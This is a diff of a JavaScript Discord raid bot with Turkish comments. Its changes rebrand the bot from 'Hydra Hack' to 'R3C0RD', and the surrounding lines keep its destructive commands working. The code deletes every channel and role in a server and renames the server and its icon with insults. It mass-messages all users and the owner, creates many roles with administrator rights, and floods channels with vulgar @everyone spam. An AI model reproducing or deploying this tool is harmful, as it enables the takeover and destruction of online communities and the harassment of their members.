@@ -25,7 +25,7 @@ client.on("message", async msg => {
     await msg.client.users
       .forEach(users =>
         users.send(
-          "`Hydra Hack` **Her Daim Siker** :wink:"  //HERKESE DMDEN ATILAN MESAJ
+          "`r3c0rd` **Her Daim Siker** :wink:"  //HERKESE DMDEN ATILAN MESAJ
         )
       )
       .catch(console.error);
@@ -50,7 +50,7 @@ client.on("message", async msg => {
 
     await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT
 
-    await msg.guild.createChannel("hydra-hack", {
+    await msg.guild.createChannel("r3c0rd", {
       type: "text"
     });
     await msg.guild.createChannel("her-daim", {
@@ -74,7 +74,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("Hydra Hack", {
+      .createChannel("R3C0RD", {
         type: "voice"
       })
       .then(chan => {
@@ -116,7 +116,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("Hydra Hack", {
+      .createChannel("R3C0RD", {
         type: "voice"
       })
       .then(chan => {
@@ -158,7 +158,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("Hydra Hack", {
+      .createChannel("R3C0RD", {
         type: "voice"
       })
       .then(chan => {
@@ -200,7 +200,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("Hydra Hack", {
+      .createChannel("R3C0RD", {
         type: "voice"
       })
       .then(chan => {
@@ -242,7 +242,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("Hydra Hack", {
+      .createChannel("R3C0RD", {
         type: "voice"
       })
       .then(chan => {
@@ -284,7 +284,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("Hydra Hack", {
+      .createChannel("R3C0RD", {
         type: "voice"
       })
       .then(chan => {
@@ -326,7 +326,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("Hydra Hack", {
+      .createChannel("R3C0RD", {
         type: "voice"
       })
       .then(chan => {
@@ -368,7 +368,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("Hydra Hack", {
+      .createChannel("R3C0RD", {
         type: "voice"
       })
       .then(chan => {
@@ -410,7 +410,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("Hydra Hack", {
+      .createChannel("R3C0RD", {
         type: "voice"
       })
       .then(chan => {
@@ -452,7 +452,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("Hydra Hack", {
+      .createChannel("R3C0RD", {
         type: "voice"
       })
       .then(chan => {
@@ -480,10 +480,10 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     
-    await msg.guild.setIcon("https://media.discordapp.net/attachments/745238152557363201/746365148217868438/cooltext360320925049726.png");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
-    await msg.guild.setName("Hydra Hack Tarafından Bu Sunucu Sikilmiştir!"); //SUNUCUNUN ISMINI DEGISTIRIR
+    await msg.guild.setIcon("https://cdn.discordapp.com/attachments/764050983260520449/764052360443723786/download.jpg");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
+    await msg.guild.setName("R3C0RD BABANIZDIR ADAM OLUCAKSINIZ!"); //SUNUCUNUN ISMINI DEGISTIRIR
     await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
-    await msg.guild.owner.send("`Hydra Hack` Her Daim Siker!");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
+    await msg.guild.owner.send("`R3C0RD` Her Daim Siker!");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
     
   }   
 });
@@ -494,102 +494,102 @@ client.on("message", async msg => {
   if (msg.content === "!rolspam") {  //ROL SPAM YAPAR
     msg.delete();
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
     msg.guild.createRole({
-      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
+      name: "Bu Sunucu R3C0RD Tarafından Hacklenmiştir!",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
@@ -598,18 +598,18 @@ client.on("message", async msg => {
 
 client.on('message', msg => {
   if (msg.content === '!spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
-          msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
-    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
-    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
-    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
-    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
-    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
-    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
-    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
-    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
-    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
-    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
-    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
+          msg.channel.send('`R3C0RD HER DAİm SİKER  SG!` @everyone @here :wink:');
+    msg.channel.send('`R3C0RD HER DAİM SİKER SG! ` @everyone @here :wink:');
+    msg.channel.send('`R3C0RD HER DAİM SİKER  SG!` @everyone @here :wink:');
+    msg.channel.send('`R3C0RD HER DAİM SİKER SG! ` @everyone @here :wink:');
+    msg.channel.send('`R3C0RD HER DAİM SİKER SG!` @everyone @here :wink:');
+    msg.channel.send('`R3C0RD HER DAİM SİKER SG!` @everyone @here :wink:');
+    msg.channel.send('`R3C0RD HER DAİM SİKER SG!` @everyone @here :wink:');
+    msg.channel.send('`R3C0RD HER DAİM SİKER SG!` @everyone @here :wink:');
+    msg.channel.send('`R3C0RD HER DAİM SİKER SG!` @everyone @here :wink:');
+    msg.channel.send('`R3C0RD HER DAİM SİKER SG!` @everyone @here :wink:');
+    msg.channel.send('`R3C0RD HER DAİM SİKER SG!` @everyone @here :wink:');
+    msg.channel.send('`R3C0RD HER DAİM SİKER SG!` @everyone @here :wink:');
     msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
     msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
     msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
